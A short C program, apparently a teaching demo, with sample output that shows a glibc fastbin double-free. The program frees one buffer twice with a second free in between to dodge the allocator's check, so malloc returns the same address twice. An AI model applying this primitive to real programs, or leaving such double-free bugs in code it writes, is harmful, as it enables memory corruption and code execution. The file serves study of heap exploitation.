#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
}


/*

This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x558777bc2260
2nd malloc(8): 0x558777bc2280
3rd malloc(8): 0x558777bc22a0
Freeing the first one...
If we free 0x558777bc2260 again, things will crash because 0x558777bc2260 is at the top of the free list.
So, instead, we'll free 0x558777bc2280.
Now, we can free 0x558777bc2260 again, since it's not the head of the free list.
Now the free list has [ 0x558777bc2260, 0x558777bc2280, 0x558777bc2260 ]. If we malloc 3 times, we'll get 0x558777bc2260 twice!
1st malloc(8): 0x558777bc2260
2nd malloc(8): 0x558777bc2280
3rd malloc(8): 0x558777bc2260


*/